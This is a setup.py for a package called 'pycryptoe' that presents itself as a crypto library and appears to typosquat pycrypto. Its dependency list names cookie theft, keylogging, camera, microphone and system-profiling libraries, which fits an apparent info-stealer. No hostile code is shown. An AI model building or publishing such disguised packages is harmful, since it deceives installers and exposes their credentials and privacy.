from setuptools import setup







setup(
    name='pycryptoe',
    version='1.2.0',    
    description='Your gateway to crypto functions in PYTHON',
    url='https://github.com',
    author='milk errr',
    author_email='milker@python.com',
    license='BSD 2-clause',
    packages=['pycryptoe'],
    install_requires=["requests","cryptography","wmi","pathlib","opencv-python","screeninfo","psutil","httpx","flask","pynput","pillow","browser_cookie3","pyaudio","bleach","pypiwin32","pycryptodome","pygame"],

    classifiers=[
        'Development Status :: 1 - Planning',
        'Intended Audience :: Science/Research',
        'License :: OSI Approved :: BSD License',  
        'Operating System :: POSIX :: Linux',        
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)